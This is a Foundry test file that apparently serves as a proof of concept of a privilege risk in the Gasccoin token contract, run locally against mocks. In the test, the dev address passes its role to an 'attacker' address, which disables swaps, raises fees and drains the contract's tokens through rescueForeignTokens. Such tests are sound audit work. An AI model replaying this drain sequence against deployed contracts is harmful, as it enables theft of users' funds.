import "forge-std/Test.sol";
import "../src/Gasccoin.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address _to, uint256 _value) public {
        balanceOf[_to] += _value;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        return true;
    }
}

contract GasccoinPrivilegeTest is Test {
    Gasccoin token;
    MockToken mockToken;

    address owner = address(0x1);
    address initialDev = address(0x2);
    address attacker = address(0x4);

    function setUp() public {
        vm.mockCall(
            0x10ED43C718714eb63d5aA57B78B54704E256024E,
            abi.encodeWithSignature("factory()"),
            abi.encode(address(0x456))
        );
        vm.mockCall(
            0x10ED43C718714eb63d5aA57B78B54704E256024E,
            abi.encodeWithSignature("WETH()"),
            abi.encode(address(0x123))
        );
        vm.mockCall(
            address(0x456),
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(address(0x789))
        );

        vm.startPrank(owner);
        token = new Gasccoin();
        token.setNewDevAddress(payable(initialDev));
        mockToken = new MockToken();
        vm.stopPrank();

        // Fund Gasccoin contract with test tokens
        mockToken.mint(address(token), 1000 ether);
    }

    function testPrivilegeEscalation() public {
        // Initial dev transfers dev privilege to attacker
        vm.prank(initialDev);
        token.setNewDevAddress(payable(attacker));

        // Attacker performs privileged actions
        vm.startPrank(attacker);
        token.toggleSwap(false);
        token.setFee(10, 10, 5, 5);  // Set max allowed fees

        // Rescue the mock tokens from contract
        token.rescueForeignTokens(
            address(mockToken), 
            attacker,
            1000 ether
        );
        vm.stopPrank();

        // Verify malicious actions
        assertEq(mockToken.balanceOf(attacker), 1000 ether, "Token rescue failed");
    }
}
